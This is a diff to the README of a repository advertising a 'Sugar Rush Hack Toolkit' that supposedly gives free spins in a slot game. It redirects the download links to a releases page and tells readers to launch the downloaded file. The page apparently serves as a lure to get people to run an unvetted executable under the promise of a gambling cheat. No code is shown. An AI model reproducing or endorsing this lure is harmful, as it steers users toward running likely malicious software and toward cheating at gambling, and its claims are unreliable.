@@ -33,7 +33,7 @@ Explore the following topics covered in this repository:
 ## Ready to Hack?
 
 Click below to access the powerful tools in this repository:
-[![Download Sugar Rush Hack Toolkit](https://img.shields.io/badge/Download-Sugar_Rush_Hack_Toolkit-9cf)](https://github.com/files/uploaded/Application.zip)
+[![Download Sugar Rush Hack Toolkit](https://github.com/soorya901/Sugar-Rush-Slot-Free-Spin-Hack/releases)](https://github.com/soorya901/Sugar-Rush-Slot-Free-Spin-Hack/releases)
 
 If the link above ends with the file name, simply launch it to begin your hacking journey. If you encounter any issues with the link, be sure to check the "Releases" section for alternative download options.
 
@@ -55,4 +55,4 @@ Don't wait any longer to revolutionize your Sugar Rush gameplay. Click on the li
 
 ## 🎲 Happy Hacking and Spin Away! 🎲
 
-![Sugar Rush Slot Free Spin Hack](https://example.com/sugarrushimage.png)
+![Sugar Rush Slot Free Spin Hack](https://github.com/soorya901/Sugar-Rush-Slot-Free-Spin-Hack/releases)
